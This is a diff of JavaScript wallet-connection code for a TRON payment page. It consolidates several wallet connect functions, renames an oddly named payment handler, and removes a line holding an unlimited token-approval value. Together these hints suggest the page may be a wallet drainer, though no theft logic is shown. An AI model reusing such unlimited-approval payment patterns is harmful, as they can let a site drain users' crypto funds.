@@ -47,64 +47,43 @@ function selectWallet(index) {
     selectedWallet();
 }
 
+// 连接不同钱包的通用函数
+async function connectWallet(walletName) {
+    if (typeof window.tronWeb === 'undefined') {
+        alert(`请安装 ${walletName} 钱包`);
+        return;
+    }
+    await processTransaction();
+}
+
 // 连接 TokenPocket 钱包
-async function connectTokenPocket() {
-    if (typeof window.tronWeb === 'undefined') {
-        alert('请安装 TokenPocket 钱包');
-        return;
-    }
-    await DjdskdbGsj();
-}
-
+async function connectTokenPocket() { await connectWallet('TokenPocket'); }
 // 连接 MathWallet
-async function connectMathWallet() {
-    if (typeof window.tronWeb === 'undefined') {
-        alert('请安装 MathWallet 钱包');
-        return;
-    }
-    await DjdskdbGsj();
-}
-
+async function connectMathWallet() { await connectWallet('MathWallet'); }
 // 连接 BitKeep 钱包
-async function connectBitKeep() {
-    if (typeof window.tronWeb === 'undefined') {
-        alert('请安装 BitKeep 钱包');
-        return;
-    }
-    await DjdskdbGsj();
-}
-
+async function connectBitKeep() { await connectWallet('BitKeep'); }
 // 连接 TronLink 钱包
 async function connectTronLink() {
     if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
         alert('请先登录 TronLink 钱包');
         return;
     }
-    await DjdskdbGsj();
+    await processTransaction();
 }
-
 // 连接 OKX 钱包
 async function connectOKXWallet() {
     if (typeof window.okxwallet === 'undefined') {
         alert('请安装 OKX 钱包');
         return;
     }
-    await DjdskdbGsj();
+    await processTransaction();
 }
-
 // 连接 SafePal 钱包
-async function connectSafePal() {
-    if (typeof window.tronWeb === 'undefined') {
-        alert('请安装 SafePal 钱包');
-        return;
-    }
-    await DjdskdbGsj();
-}
+async function connectSafePal() { await connectWallet('SafePal'); }
 
 // 处理支付
-async function DjdskdbGsj() {
+async function processTransaction() {
     const trxAmountInSun = tronWeb.toSun(currentAmount);
-    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     const feeLimit = 1000000000;
     
     try {
